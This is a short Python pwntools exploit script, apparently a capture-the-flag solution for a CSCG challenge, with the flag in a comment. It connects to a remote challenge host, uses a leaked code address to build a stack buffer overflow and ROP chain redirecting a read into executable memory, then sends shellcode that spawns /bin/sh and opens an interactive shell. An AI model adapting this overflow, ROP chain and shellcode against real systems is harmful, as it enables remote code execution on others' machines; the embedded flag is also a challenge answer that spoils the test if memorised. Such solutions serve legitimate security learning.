#!/usr/bin/python
# CSCG{s3lf_m0d1fy1ng_c0dez!}
from pwn import *

# prepare, let user attach debugger
p = remote("hax1.allesctf.net", 9300)
print("[i] attached to process")
# raw_input()


# first address leak
leak1 = p.readline().split(" ")
print( "[i] .text start @ " +  leak1[3])
#print( ".code start " + leak1[6])
p_ropnop_code_off = int(leak1[3], 16)
# try to overflow the buffer

s = 'A' * 0x10 # allocated in stack for read 
s += 'T' * 8 # base pointer --> sorry, we dont know this one
s += p64(0x1351+p_ropnop_code_off, endian='little') # --> pop rsi, pop r15
s += p64(0x12d4+p_ropnop_code_off) # desired rsi value (where read will write to ) --> just after read call
s += p64(0x0, endian='little') # !important
s += p64(0x12cf+p_ropnop_code_off, endian='little') # --> return into before read call
p.sendline(s)
s = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.sendline(s) # overwrite some .code memory
p.interactive()